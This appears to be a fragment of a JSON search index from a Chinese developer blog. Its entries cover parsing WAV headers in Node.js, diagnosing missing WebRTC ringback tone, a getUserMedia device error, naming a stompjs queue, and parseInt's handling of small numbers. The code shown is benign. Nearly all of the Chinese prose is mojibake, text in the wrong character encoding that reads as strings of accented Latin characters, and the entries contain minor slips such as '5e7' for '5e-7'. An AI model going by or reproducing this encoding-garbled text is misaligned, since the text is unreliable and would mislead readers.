ç”¨äº†å›ºå®šå¤§å°çš„å­—èŠ‚æ•°ã€‚\nçŸ¥é“å­—èŠ‚æ•°ä¹‹åï¼Œå°±éœ€è¦æŒ‰ç…§æ­£ç¡®çš„å­—èŠ‚åºè¯»åŒºã€‚å­—èŠ‚åºè¯»åäº†ï¼Œå¯èƒ½è¯»å‡ºä¸€å †ä¹±ç ã€‚ å…³äºå­—èŠ‚åºï¼Œå¯ä»¥å‚è€ƒé˜®ä¸€å³°è€å¸ˆå†™çš„ç†è§£å­—èŠ‚åºè¿™ç¯‡æ–‡ç« ã€‚\nstep1: è¯»å–æ–‡ä»¶ const fs = require(\u0026#39;fs\u0026#39;) const path = require(\u0026#39;path\u0026#39;) const file = fs.readFileSync(path.join(__dirname, \u0026#39;./a.wav\u0026#39;)) console.log(file) åŸå§‹çš„æ‰“å°ï¼ŒäºŒè¿›åˆ¶ä»¥16è¿›åˆ¶çš„æ–¹å¼æ˜¾ç¤ºã€‚çœ‹ä¸å‡ºå…¶ä¸­æœ‰ä½•å«ä¹‰ã€‚\nnode main.js \u0026lt;Buffer 52 49 46 46 a4 23 48 00 57 41 56 45 66 6d 74 20 10 00 00 00 01 00 02 00 40 1f 00 00 00 7d 00 00 04 00 10 00 64 61 74 61 80 23 48 00 00 00 00 00 00 00 ... 4727674 more bytes\u0026gt; step2: å·¥å…·å‡½æ•° // å°†bufè½¬ä¸ºå­—ç¬¦ä¸² function buffer2String (buf) { let int = [] for (let i=0; i\u0026lt;buf.length; i++) { int.push(buf.readUInt8(i)) } return String.fromCharCode(...int) } // å¯¹è¯»åŒºçš„å¤´å­—æ®µçš„å€¼è¿›è¡Œæ ¡éªŒ // å®é™…ä¸Šå¤´å­—æ®µä¹‹é—´æ˜¯å­˜åœ¨ä¸€å®šçš„å…³ç³»çš„ function validWav (wav, fileSize) { //20 2 AudioFormat PCM = 1 (i.e. Linear quantization) // Values other than 1 indicate some // form of compression. // 22 2 NumChannels Mono = 1, Stereo = 2, etc. // 24 4 SampleRate 8000, 44100, etc. // 28 4 ByteRate == SampleRate * NumChannels * BitsPerSample/8 // 32 2 BlockAlign == NumChannels * BitsPerSample/8 // The number of bytes for one sample including // all channels. I wonder what happens when // this number isn\u0026#39;t an integer? // 34 2 BitsPerSample 8 bits = 8, 16 bits = 16, etc. if (wav.AudioFormat !== 1) { return 1 } if (![1,2].includes(wav.NumChannels)){ return 2 } if (![8000,44100].includes(wav.SampleRate)){ return 3 } if (![8,16].includes(wav.BitsPerSample)){ return 4 } if (wav.ByteRate !== wav.SampleRate * wav.NumChannels * wav.BitsPerSample / 8){ return 5 } if (wav.BlockAlign !== wav.NumChannels * wav.BitsPerSample / 8 ){ return 6 } if (wav.ChunkSize + 8 !== fileSize) { return 7 } return 0 } class ByteWalk { constructor(buf){ // è®°å½•å½“å‰è¯»è¿‡çš„å­—èŠ‚æ•° this.current = 0 // è®°å½•æ•´ä¸ªbuf this.buf = buf } // ç”¨æ¥æŒ‡å®šè¦è¯»å–çš„å­—èŠ‚æ•°ï¼Œä»¥åŠå®ƒçš„æ ¼å¼ step(s, f){ if (this.current === this.buf.length) { return } let bf if (arguments.length === 0) { s = this.buf.length - this.current } if (this.current + s \u0026gt;= this.buf.length) { bf = this.buf.slice(this.current, this.buf.length) this.current = this.buf.length } else { bf = this.buf.slice(this.current, this.current + s) this.current += s } // ä¸€ä¸ªç‰¹æ®Šçš„æ ‡è®°ï¼Œç”¨æ¥æ ‡è®°æŒ‰ç…§å­—ç¬¦ä¸²çš„æ–¹å¼è¯»å–buf if (f === \u0026#39;readStringBE\u0026#39;) { return buffer2String(bf) } if (!f) { return bf } return bf[f](); } } function readData (buf, step, read) { let data = [] for (let i=0; i\u0026lt;buf.length; i += step) { data.push(buf[read](i)) } return data } module.exports = { buffer2String, // validFile, ByteWalk, validWav, readData } step3: mainå‡½æ•° const fs = require(\u0026#39;fs\u0026#39;) const path = require(\u0026#39;path\u0026#39;) const { ByteWalk, validWav, readData } = require(\u0026#39;./util\u0026#39;) const file = fs.readFileSync(path.join(__dirname, \u0026#39;./a.wav\u0026#39;)) const B = new ByteWalk(file) // æŒ‰ç…§å›ºå®šçš„å­—èŠ‚æ•°è¯»å– let friendData = { ChunkID: B.step(4,\u0026#39;readStringBE\u0026#39;), ChunkSize: B.step(4, \u0026#39;readUInt32LE\u0026#39;), Format: B.step(4, \u0026#39;readStringBE\u0026#39;), Subchunk1ID: B.step(4, \u0026#39;readStringBE\u0026#39;), Subchunk1Size: B.step(4, \u0026#39;readUInt32LE\u0026#39;), AudioFormat: B.step(2, \u0026#39;readUInt16LE\u0026#39;), NumChannels: B.step(2, \u0026#39;readUInt16LE\u0026#39;), SampleRate: B.step(4, \u0026#39;readUInt32LE\u0026#39;), ByteRate: B.step(4, \u0026#39;readUInt32LE\u0026#39;), BlockAlign: B.step(2, \u0026#39;readUInt16LE\u0026#39;), BitsPerSample: B.step(2, \u0026#39;readUInt16LE\u0026#39;), Subchunk2ID: B.step(4, \u0026#39;readStringBE\u0026#39;), Subchunk2Size: B.step(4, \u0026#39;readUInt32LE\u0026#39;), Data: B.step() } // var data = readData(friendData.Data, friendData.BlockAlign, \u0026#39;readInt16LE\u0026#39;) console.log(validWav(friendData, file.length)) console.log(friendData, friendData.Data.length) // console.log(data) ä»è¾“å‡ºçš„å†…å®¹å¯ä»¥çœ‹åˆ°ï¼Œä¸ªä¸ªå¤´å­—æ®µåŸºæœ¬ä¸Šéƒ½è¯»å–å‡ºæ¥äº†ã€‚\n0 { ChunkID: \u0026#39;RIFF\u0026#39;, ChunkSize: 4727716, Format: \u0026#39;WAVE\u0026#39;, Subchunk1ID: \u0026#39;fmt \u0026#39;, Subchunk1Size: 16, AudioFormat: 1, NumChannels: 2, SampleRate: 8000, ByteRate: 32000, BlockAlign: 4, BitsPerSample: 16, Subchunk2ID: \u0026#39;data\u0026#39;, Subchunk2Size: 4727680, Data: \u0026lt;Buffer 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ... 4727630 more bytes\u0026gt; } 4727680 æƒ³è¦æ·±å…¥ç†è§£wavæ–‡ä»¶æ ¼å¼çš„ï¼Œå¯ä»¥çœ‹ä¸‹æœ€åçš„å‚è€ƒèµ„æ–™ã€‚\nä¹‹åå¤§å®¶å¯ä»¥ä»åšä¸€äº›æœ‰è¶£çš„äº‹æƒ…ï¼Œä¾‹å¦‚åŒå£°é“çš„å£°éŸ³åšå£°é“åˆ†ç¦»ï¼Œæˆ–è€…è¯´åŒå£°é“åˆå¹¶æˆå•å£°é“ç­‰ç­‰ã€‚\nå‚è€ƒèµ„æ–™ http://soundfile.sapp.org/doc/WaveFormat/ ","permalink":"https://wdd.js.org/fe/nodejs-read-wav-file/","summary":"ç›¸æ¯”äºæ™®é€šçš„æ–‡ä»¶ï¼ŒäºŒè¿›åˆ¶çš„æ–‡ä»¶ç•¥æ˜¾ç¥ç§˜ã€‚æœ¬æ¬¡å°±ä¸ºå¤§å®¶æ­å¼€äºŒè¿›åˆ¶æ–‡ä»¶çš„é¢çº±ã€‚\nWAVæ–‡ä»¶çš„æ ¼å¼ ä¸‹å›¾æ˜¯ä¸€ä¸ªæ™®é€šçš„wavæ–‡ä»¶çš„æ ¼å¼ã€‚å…¶ä¸­é™¤äº†æœ€åçš„dataéƒ¨åˆ†ï¼Œå…¶ä»–çš„æ¯ä¸ªæ ¼å­éƒ½å ç”¨äº†å›ºå®šå¤§å°çš„å­—èŠ‚æ•°ã€‚\nçŸ¥é“å­—èŠ‚æ•°ä¹‹åï¼Œå°±éœ€è¦æŒ‰ç…§æ­£ç¡®çš„å­—èŠ‚åºè¯»åŒºã€‚å­—èŠ‚åºè¯»åäº†ï¼Œå¯èƒ½è¯»å‡ºä¸€å †ä¹±ç ã€‚ å…³äºå­—èŠ‚åºï¼Œå¯ä»¥å‚è€ƒé˜®ä¸€å³°è€å¸ˆå†™çš„ç†è§£å­—èŠ‚åºè¿™ç¯‡æ–‡ç« ã€‚\nstep1: è¯»å–æ–‡ä»¶ const fs = require(\u0026#39;fs\u0026#39;) const path = require(\u0026#39;path\u0026#39;) const file = fs.readFileSync(path.join(__dirname, \u0026#39;./a.wav\u0026#39;)) console.log(file) åŸå§‹çš„æ‰“å°ï¼ŒäºŒè¿›åˆ¶ä»¥16è¿›åˆ¶çš„æ–¹å¼æ˜¾ç¤ºã€‚çœ‹ä¸å‡ºå…¶ä¸­æœ‰ä½•å«ä¹‰ã€‚\nnode main.js \u0026lt;Buffer 52 49 46 46 a4 23 48 00 57 41 56 45 66 6d 74 20 10 00 00 00 01 00 02 00 40 1f 00 00 00 7d 00 00 04 00 10 00 64 61 74 61 80 23 48 00 00 00 00 00 00 00 .","title":"Node.jsè¯»å–wavæ–‡ä»¶"},{"content":"ä»€ä¹ˆæ˜¯å›é“ƒéŸ³ï¼Ÿ å›é“ƒéŸ³çš„ç‰¹ç‚¹\nå›é“ƒéŸ³æ˜¯ç”±è¿è¥å•†é€ç»™æ‰‹æœºçš„ï¼Œè€Œä¸æ˜¯ç”±è¢«å«é€ç»™ä¸»å«çš„ã€‚ å›é“ƒéŸ³çš„æ’­æ”¾é˜¶æ®µæ˜¯åœ¨è¢«å«æ¥å¬å‰æ’­æ”¾ï¼Œè¢«å«ä¸€æ—¦æ¥å¬ï¼Œå›é“ƒéŸ³åˆ™æ’­æ”¾ç»“æŸ å›é“ƒéŸ³ä¸€èˆ¬æ˜¯450Hz, å˜Ÿä¸€ç§’ï¼Œåœ4ç§’ï¼Œ5ç§’ä¸€ä¸ªå‘¨æœŸ å›é“ƒéŸ³åˆ†ä¸ºä¸‰ç§\nèˆ’é€‚å™ªéŸ³é˜¶æ®µï¼šå°±æ˜¯å˜Ÿä¸€ç§’ï¼Œåœ4ç§’çš„é˜¶æ®µ å½©é“ƒé˜¶æ®µï¼šæœ‰çš„æ‰‹æœºï¼Œåœ¨æ¥å¬ä¹‹å‰ï¼Œä¼šå‘ä¸»å«æ–¹æ’­æ”¾ä¸ªæ€§åŒ–çš„è¯­éŸ³ï¼Œä¾‹å¦‚æ”¾ç‚¹æµè¡ŒéŸ³ä¹ä¹‹ç±»çš„ å®šåˆ¶å›éŸ³é˜¶æ®µï¼šä¾‹å¦‚è¢«å«æ”¾ç«‹å³æŠŠç”µè¯ç»™æ‹’ç»äº†ï¼Œä½†æ˜¯ä¸»å«æ”¾è¿™è¾¹å¹¶æ²¡æœ‰æŒ‚ç”µè¯ï¼Œè€Œæ˜¯åœ¨æ’­æ”¾ï¼šå¯¹ä¸èµ·ï¼Œæ‚¨æ‹¨æ‰“çš„ç”µè¯æ— äººæ¥å¬ï¼Œè¯·ç¨åå†æ’­ é—®é¢˜ç°è±¡ WebRTCæ‹¨æ‰“å‡ºå»ä¹‹åï¼Œåœ¨å®¢æˆ·æ¥å¬ä¹‹å‰ï¼Œå¬ä¸åˆ°ä»»ä½•å›é“ƒéŸ³ã€‚åœ¨å®¢æˆ·æ¥å¬ä¹‹åï¼Œå¯ä»¥çŸ­æš‚çš„å¬åˆ°ä¸€ç‚¹ç‚¹å›é“ƒéŸ³ã€‚ é—®é¢˜æ’æŸ¥æ€è·¯ æœåŠ¡ç«¯é—®é¢˜ å®¢æˆ·ç«¯é—®é¢˜ ç½‘ç»œé—®é¢˜ ç½‘ç»œæ¶æ„ é¦–å…ˆæ ¹æ®ç½‘ç»œæ¶æ„å›¾ï¼Œæˆ‘å†³å®šåœ¨aç‚¹å’Œbç‚¹è¿›è¡ŒæŠ“åŒ… æŠ“åŒ…ä¹‹åç”¨wiresharkè¿›è¡Œåˆ†æã€‚å¾—å‡ºä»¥ä¸‹ç»“è®º\nsipæœåŠ¡å™¨ABä¹‹é—´ç”¨çš„æ˜¯g711ç¼–ç ï¼Œè¯­éŸ³æµæ²¡æœ‰åŠ å¯†ã€‚ä»bç‚¹æŠ“çš„åŒ…ï¼Œèƒ½å¤Ÿä»ä¸­æå–å‡ºSIPæœåŠ¡å™¨Bå‘sipæœåŠ¡å™¨Aå‘é€çš„è¯­éŸ³æµï¼Œå¯ä»¥å¬åˆ°å›é“ƒéŸ³ã€‚è¯´æ˜SIPæœåŠ¡å™¨Aæ˜¯æ”¶åˆ°äº†å›é“ƒéŸ³çš„ã€‚ abä¸¤ç‚¹ä¹‹é—´çš„WebRTCè¯­éŸ³æµæ˜¯åŠ å¯†çš„ï¼Œæ— æ³•åˆ†æå‡ºå…¶ä¸­æ˜¯å¦å«æœ‰è¯­éŸ³æµã€‚ è™½ç„¶æ— æ³•æå–å‡ºWebRTCè¯­éŸ³æµã€‚ä½†æ˜¯é€šè¿‡wireshark Statistics -\u0026gt; Conversation åˆ†æï¼Œå¾—å‡ºç»“è®ºï¼šåœ¨ç”µè¯æ¥é€šä¹‹å‰ï¼Œaç‚¹æ”¶åˆ°çš„udpåŒ…å’Œä»bç‚¹å‘å‡ºçš„udpåŒ…çš„æ•°é‡æ˜¯æ˜¯ä¸€è‡´çš„ã€‚è¯´æ˜webrtcå®¢æˆ·ç«¯å®é™…ä¸Šæ˜¯æ”¶åˆ°äº†è¯­éŸ³æµã€‚åªä¸è¿‡å®¢æˆ·ç«¯æ²¡æœ‰æ’­æ”¾ã€‚ç„¶åé—®é¢˜å®šä½åˆ°å®¢æˆ·ç«¯çš„jsåº“ã€‚ é€šè¿‡åˆ†æå®¢æˆ·ç«¯åº“çš„ä»£ç ï¼Œå®šä½åˆ°å…·ä½“ä»£ç çš„ä½ç½®ã€‚è§£å†³é—®é¢˜ï¼Œå¹¶å‘å¼€æºåº“æäº¤äº†ä¿®å¤bugçš„çš„pull requestã€‚å®é™…ä¸Šåªæ˜¯ä¿®æ”¹äº†ä¸€è¡Œä»£ç ã€‚https://github.com/versatica/JsSIP/pull/669 é—®é¢˜æ€»ç»“ è§£å†³é—®é¢˜çœ‹ä¼¼å¾ˆç®€å•ï¼Œä½†æ˜¯éœ€è¦çš„å¾ˆå¼ºçš„é—®é¢˜åˆ†æèƒ½åŠ›ï¼Œå¹¶ä¸”å¯¹ç½‘ç»œåè®®ï¼Œç½‘ç»œæ¶æ„ï¼ŒwiresharkæŠ“åŒ…åˆ†æéƒ½è¦ç²¾é€šï¼Œæ‰èƒ½çœŸæ­£çš„çœ‹åˆ°æ·±å±‚æ¬¡çš„ä¸œè¥¿ã€‚\n","permalink":"https://wdd.js.org/fe/webrtc-has-no-earlymedia/","summary":"ä»€ä¹ˆæ˜¯å›é“ƒéŸ³ï¼Ÿ å›é“ƒéŸ³çš„ç‰¹ç‚¹\nå›é“ƒéŸ³æ˜¯ç”±è¿è¥å•†é€ç»™æ‰‹æœºçš„ï¼Œè€Œä¸æ˜¯ç”±è¢«å«é€ç»™ä¸»å«çš„ã€‚ å›é“ƒéŸ³çš„æ’­æ”¾é˜¶æ®µæ˜¯åœ¨è¢«å«æ¥å¬å‰æ’­æ”¾ï¼Œè¢«å«ä¸€æ—¦æ¥å¬ï¼Œå›é“ƒéŸ³åˆ™æ’­æ”¾ç»“æŸ å›é“ƒéŸ³ä¸€èˆ¬æ˜¯450Hz, å˜Ÿä¸€ç§’ï¼Œåœ4ç§’ï¼Œ5ç§’ä¸€ä¸ªå‘¨æœŸ å›é“ƒéŸ³åˆ†ä¸ºä¸‰ç§\nèˆ’é€‚å™ªéŸ³é˜¶æ®µï¼šå°±æ˜¯å˜Ÿä¸€ç§’ï¼Œåœ4ç§’çš„é˜¶æ®µ å½©é“ƒé˜¶æ®µï¼šæœ‰çš„æ‰‹æœºï¼Œåœ¨æ¥å¬ä¹‹å‰ï¼Œä¼šå‘ä¸»å«æ–¹æ’­æ”¾ä¸ªæ€§åŒ–çš„è¯­éŸ³ï¼Œä¾‹å¦‚æ”¾ç‚¹æµè¡ŒéŸ³ä¹ä¹‹ç±»çš„ å®šåˆ¶å›éŸ³é˜¶æ®µï¼šä¾‹å¦‚è¢«å«æ”¾ç«‹å³æŠŠç”µè¯ç»™æ‹’ç»äº†ï¼Œä½†æ˜¯ä¸»å«æ”¾è¿™è¾¹å¹¶æ²¡æœ‰æŒ‚ç”µè¯ï¼Œè€Œæ˜¯åœ¨æ’­æ”¾ï¼šå¯¹ä¸èµ·ï¼Œæ‚¨æ‹¨æ‰“çš„ç”µè¯æ— äººæ¥å¬ï¼Œè¯·ç¨åå†æ’­ é—®é¢˜ç°è±¡ WebRTCæ‹¨æ‰“å‡ºå»ä¹‹åï¼Œåœ¨å®¢æˆ·æ¥å¬ä¹‹å‰ï¼Œå¬ä¸åˆ°ä»»ä½•å›é“ƒéŸ³ã€‚åœ¨å®¢æˆ·æ¥å¬ä¹‹åï¼Œå¯ä»¥çŸ­æš‚çš„å¬åˆ°ä¸€ç‚¹ç‚¹å›é“ƒéŸ³ã€‚ é—®é¢˜æ’æŸ¥æ€è·¯ æœåŠ¡ç«¯é—®é¢˜ å®¢æˆ·ç«¯é—®é¢˜ ç½‘ç»œé—®é¢˜ ç½‘ç»œæ¶æ„ é¦–å…ˆæ ¹æ®ç½‘ç»œæ¶æ„å›¾ï¼Œæˆ‘å†³å®šåœ¨aç‚¹å’Œbç‚¹è¿›è¡ŒæŠ“åŒ… æŠ“åŒ…ä¹‹åç”¨wiresharkè¿›è¡Œåˆ†æã€‚å¾—å‡ºä»¥ä¸‹ç»“è®º\nsipæœåŠ¡å™¨ABä¹‹é—´ç”¨çš„æ˜¯g711ç¼–ç ï¼Œè¯­éŸ³æµæ²¡æœ‰åŠ å¯†ã€‚ä»bç‚¹æŠ“çš„åŒ…ï¼Œèƒ½å¤Ÿä»ä¸­æå–å‡ºSIPæœåŠ¡å™¨Bå‘sipæœåŠ¡å™¨Aå‘é€çš„è¯­éŸ³æµï¼Œå¯ä»¥å¬åˆ°å›é“ƒéŸ³ã€‚è¯´æ˜SIPæœåŠ¡å™¨Aæ˜¯æ”¶åˆ°äº†å›é“ƒéŸ³çš„ã€‚ abä¸¤ç‚¹ä¹‹é—´çš„WebRTCè¯­éŸ³æµæ˜¯åŠ å¯†çš„ï¼Œæ— æ³•åˆ†æå‡ºå…¶ä¸­æ˜¯å¦å«æœ‰è¯­éŸ³æµã€‚ è™½ç„¶æ— æ³•æå–å‡ºWebRTCè¯­éŸ³æµã€‚ä½†æ˜¯é€šè¿‡wireshark Statistics -\u0026gt; Conversation åˆ†æï¼Œå¾—å‡ºç»“è®ºï¼šåœ¨ç”µè¯æ¥é€šä¹‹å‰ï¼Œaç‚¹æ”¶åˆ°çš„udpåŒ…å’Œä»bç‚¹å‘å‡ºçš„udpåŒ…çš„æ•°é‡æ˜¯æ˜¯ä¸€è‡´çš„ã€‚è¯´æ˜webrtcå®¢æˆ·ç«¯å®é™…ä¸Šæ˜¯æ”¶åˆ°äº†è¯­éŸ³æµã€‚åªä¸è¿‡å®¢æˆ·ç«¯æ²¡æœ‰æ’­æ”¾ã€‚ç„¶åé—®é¢˜å®šä½åˆ°å®¢æˆ·ç«¯çš„jsåº“ã€‚ é€šè¿‡åˆ†æå®¢æˆ·ç«¯åº“çš„ä»£ç ï¼Œå®šä½åˆ°å…·ä½“ä»£ç çš„ä½ç½®ã€‚è§£å†³é—®é¢˜ï¼Œå¹¶å‘å¼€æºåº“æäº¤äº†ä¿®å¤bugçš„çš„pull requestã€‚å®é™…ä¸Šåªæ˜¯ä¿®æ”¹äº†ä¸€è¡Œä»£ç ã€‚https://github.com/versatica/JsSIP/pull/669 é—®é¢˜æ€»ç»“ è§£å†³é—®é¢˜çœ‹ä¼¼å¾ˆç®€å•ï¼Œä½†æ˜¯éœ€è¦çš„å¾ˆå¼ºçš„é—®é¢˜åˆ†æèƒ½åŠ›ï¼Œå¹¶ä¸”å¯¹ç½‘ç»œåè®®ï¼Œç½‘ç»œæ¶æ„ï¼ŒwiresharkæŠ“åŒ…åˆ†æéƒ½è¦ç²¾é€šï¼Œæ‰èƒ½çœŸæ­£çš„çœ‹åˆ°æ·±å±‚æ¬¡çš„ä¸œè¥¿ã€‚","title":"è®°ä¸€æ¬¡WebRTCæ— å›é“ƒéŸ³é—®é¢˜æ’æŸ¥"},{"content":"åœ¨PCç«¯ï¼Œä½¿ç”¨WebRTCé€šè¯ä¸€èˆ¬éƒ½ä¼šä½¿ç”¨è€³éº¦ï¼Œå¦‚æœè€³éº¦æœ‰é—®é¢˜ï¼Œå¯èƒ½å°±ä¼šæŠ¥è¿™ä¸ªé”™ã€‚ æ‰€ä»¥æœ€å¥½å¤šæ¢å‡ ä¸ªè€³éº¦ï¼Œè¯•è¯•ã€‚\n","permalink":"https://wdd.js.org/fe/webrtc-domexception/","summary":"åœ¨PCç«¯ï¼Œä½¿ç”¨WebRTCé€šè¯ä¸€èˆ¬éƒ½ä¼šä½¿ç”¨è€³éº¦ï¼Œå¦‚æœè€³éº¦æœ‰é—®é¢˜ï¼Œå¯èƒ½å°±ä¼šæŠ¥è¿™ä¸ªé”™ã€‚ æ‰€ä»¥æœ€å¥½å¤šæ¢å‡ ä¸ªè€³éº¦ï¼Œè¯•è¯•ã€‚","title":"WebRTC getUserMedia DOMException Requested Device not found"},{"content":"client.onConnect = function (frame) { console.log(\u0026#39;onConnect\u0026#39;, frame) client.subscribe(\u0026#39;/topic/event.agent.*.abc_cc\u0026#39;, function (msg) { console.log(msg) }, { id: \u0026#39;wdd\u0026#39;, \u0026#39;x-queue-name\u0026#39;: \u0026#39;wdd-queue\u0026#39; }) } åœ¨mqç®¡ç†ç«¯ï¼š\nOptional Arguments Optional queue arguments, also known as \u0026ldquo;x-arguments\u0026rdquo; because of their field name in the AMQP 0-9-1 protocol, is a map (dictionary) of arbitrary key/value pairs that can be provided by clients when a queue is declared. -https://www.rabbitmq.com/queues.html\n","permalink":"https://wdd.js.org/fe/stompjs-set-queue-name/","summary":"client.onConnect = function (frame) { console.log(\u0026#39;onConnect\u0026#39;, frame) client.subscribe(\u0026#39;/topic/event.agent.*.abc_cc\u0026#39;, function (msg) { console.log(msg) }, { id: \u0026#39;wdd\u0026#39;, \u0026#39;x-queue-name\u0026#39;: \u0026#39;wdd-queue\u0026#39; }) } åœ¨mqç®¡ç†ç«¯ï¼š\nOptional Arguments Optional queue arguments, also known as \u0026ldquo;x-arguments\u0026rdquo; because of their field name in the AMQP 0-9-1 protocol, is a map (dictionary) of arbitrary key/value pairs that can be provided by clients when a queue is declared. -https://www.rabbitmq.com/queues.html","title":"stompjs ä½¿ç”¨x-queue-nameæŒ‡å®šé˜Ÿåˆ—å"},{"content":"æœ€è¿‘çœ‹äº†ä¸€ç¯‡æ–‡ç« ï¼Œé‡Œé¢æå‡ºä¸€ä¸ªé—®é¢˜ï¼Ÿ\nparseInt(0.0000005)ä¸ºä»€ä¹ˆç­‰äº5ï¼Ÿ\næœ€ç»ˆä¹Ÿç»™å‡ºäº†è§£é‡Šï¼ŒparseIntçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¦‚æœä¸æ˜¯å­—ç¬¦ä¸²çš„è¯, å°†ä¼šè°ƒç”¨ToStringæ–¹æ³•ï¼Œå°†å…¶è½¬ä¸ºå­—ç¬¦ä¸²ã€‚\nstring The value to parse. If this argument is not a string, then it is converted to one using theToStringabstract operation. Leadingwhitespacein this argument is ignored. MDN\næˆ‘ä»¬åœ¨consoleé¢æ¿ä¸Šç›´æ¥è¾“å…¥0.0000005å›è½¦ä¹‹åå‘ç°æ˜¯5e-7ã€‚æˆ‘ä»¬ä½¿ç”¨toSting()æ–¹æ³•è½¬æ¢ä¹‹åå‘ç°æ˜¯å­—ç¬¦ä¸²5e7\nå­—ç¬¦ä¸²5e-7è½¬æˆæ•´æ•°5æ˜¯æ²¡ä»€ä¹ˆç–‘é—®çš„ï¼Œé—®é¢˜åœ¨äºä¸ºä»€ä¹ˆ0.0000005è½¬æˆ5e-7ã€‚è€Œå¦‚æœå°‘ä¸€ä¸ªé›¶ï¼Œå°±å¯ä»¥çœ‹åˆ°consoleä¼šåŸæ ·è¾“å‡ºã€‚\næ•°å€¼ç±»å‹å¦‚ä½•è½¬å­—ç¬¦ä¸²ï¼Ÿ å¯¹äºæ•°å€¼ç±»å‹ï¼Œæ˜¯ä½¿ç”¨Number.toString()æ–¹æ³•è½¬æ¢çš„ã€‚\nNumber.toString(x)çš„ç®—æ³•åˆ†æ è¿™ä¸ªç®—æ³•å¹¶æ²¡æœ‰åƒæˆ‘ä»¬æƒ³è±¡çš„é‚£ä¹ˆç®€å•ã€‚\nå…ˆè¯´ä¸€äº›ç®€å•åœºæ™¯\nç®€å•åœºæ™¯ Number.toString(x) å¦‚æœxæ˜¯NaN, è¿”å›\u0026quot;NaN\u0026quot; å¦‚æœxæ˜¯+0æˆ–è€…-0ï¼Œ è¿”å›\u0026quot;0\u0026quot; å¦‚æœxæ˜¯è´Ÿæ•°è¿”å›, è¿”å›Number.toString(-x) å¦‚æœxæ˜¯æ­£æ— ç©·ï¼Œè¿”å›\u0026quot;Infinity\u0026quot; å¤æ‚åœºæ™¯ å¯ä»¥çœ‹å‡ºï¼Œ0.0000005å¹¶ä¸åœ¨ç®€å•åœºæ™¯ä¸­ã€‚ä¸‹é¢å°±è¿›å…¥åˆ°å¤æ‚åœºæ™¯äº†ã€‚\nä¼šç”¨åˆ°ä¸€ä¸ªå…¬å¼\nk,s,néƒ½æ˜¯æ•´æ•° kå¤§äºç­‰äº1 10çš„k-1æ¬¡æ–¹å°äºç­‰äºs, ä¸”så°äºç­‰äº10çš„kæ¬¡æ–¹ 10çš„n-kæ¬¡æ–¹å±äºå®æ•° 0.0000005å¯ä»¥è¡¨ç¤ºä¸º5*10çš„-7æ¬¡æ–¹ã€‚ä»£å…¥ä¸Šé¢çš„å…¬å¼ï¼Œå¯ä»¥ç®—å‡º: k=1, s=5, n=-6ã€‚\nå‚è€ƒ https://dmitripavlutin.com/parseint-mystery-javascript/ https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt https://tc39.es/ecma262/#sec-numeric-types-number-tostring ","permalink":"https://wdd.js.org/fe/parseint-with-little-number/","summary":"æœ€è¿‘çœ‹äº†ä¸€ç¯‡æ–‡ç« ï¼Œé‡Œé¢æå‡ºä¸€ä¸ªé—®é¢˜ï¼Ÿ\nparseInt(0.0000005)ä¸ºä»€ä¹ˆç­‰äº5ï¼Ÿ\næœ€ç»ˆä¹Ÿç»™å‡ºäº†è§£é‡Šï¼ŒparseIntçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¦‚æœä¸æ˜¯å­—ç¬¦ä¸²çš„è¯, å°†ä¼šè°ƒç”¨ToStringæ–¹æ³•ï¼Œå°†å…¶è½¬ä¸ºå­—ç¬¦ä¸²ã€‚\nstring The value to parse. If this argument is not a string, then it is converted to one using theToStringabstract operation. Leadingwhitespacein this argument is ignored. MDN\næˆ‘ä»¬åœ¨consoleé¢æ¿ä¸Šç›´æ¥è¾“å…¥0.0000005å›è½¦ä¹‹åå‘ç°æ˜¯5e-7ã€‚æˆ‘ä»¬ä½¿ç”¨toSting()æ–¹æ³•è½¬æ¢ä¹‹åå‘ç°æ˜¯å­—ç¬¦ä¸²5e7\nå­—ç¬¦ä¸²5e-7è½¬æˆæ•´æ•°5æ˜¯æ²¡ä»€ä¹ˆç–‘é—®çš„ï¼Œé—®é¢˜åœ¨äºä¸ºä»€ä¹ˆ0.0000005è½¬æˆ5e-7ã€‚è€Œå¦‚æœå°‘ä¸€ä¸ªé›¶ï¼Œå°±å¯ä»¥çœ‹åˆ°consoleä¼šåŸæ ·è¾“å‡ºã€‚\næ•°å€¼ç±»å‹å¦‚ä½•è½¬å­—ç¬¦ä¸²ï¼Ÿ å¯¹äºæ•°å€¼ç±»å‹ï¼Œæ˜¯ä½¿ç”¨Number.toString()æ–¹æ³•è½¬æ¢çš„ã€‚\nNumber.toString(x)çš„ç®—æ³•åˆ†æ è¿™ä¸ªç®—æ³•å¹¶æ²¡æœ‰åƒæˆ‘ä»¬æƒ³è±¡çš„é‚£ä¹ˆç®€å•ã€‚\nå…ˆè¯´ä¸€äº›ç®€å•åœºæ™¯\nç®€å•åœºæ™¯ Number.toString(x) å¦‚æœxæ˜¯NaN, è¿”å›\u0026quot;NaN\u0026quot; å¦‚æœxæ˜¯+0æˆ–è€…-0ï¼Œ è¿”å›\u0026quot;0\u0026quot; å¦‚æœxæ˜¯è´Ÿæ•°è¿”å›, è¿”å›Number.toString(-x) å¦‚æœxæ˜¯æ­£æ— ç©·ï¼Œè¿”å›\u0026quot;Infinity\u0026quot; å¤æ‚åœºæ™¯ å¯ä»¥çœ‹å‡ºï¼Œ0.0000005å¹¶ä¸åœ¨ç®€å•åœºæ™¯ä¸­ã€‚ä¸‹é¢å°±è¿›å…¥åˆ°å¤æ‚åœºæ™¯äº†ã€‚\nä¼šç”¨åˆ°ä¸€ä¸ªå…¬å¼\nk,s,néƒ½æ˜¯æ•´æ•° kå¤§äºç­‰äº1 10çš„k-1æ¬¡æ–¹å°äºç­‰äºs, ä¸”så°äºç­‰äº10çš„kæ¬¡æ–¹ 10çš„n-kæ¬¡æ–¹å±äºå®æ•° 0.0000005å¯ä»¥è¡¨ç¤ºä¸º5*10çš„-7æ¬¡æ–¹ã€‚ä»£å…¥ä¸Šé¢çš„å…¬å¼ï¼Œå¯ä»¥ç®—å‡º: k=1, s=5, n=-6ã€‚\nå‚è€ƒ https://dmitripavlutin.com/parseint-mystery-javascript/ https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt https://tc39.es/ecma262/#sec-numeric-types-number-tostring 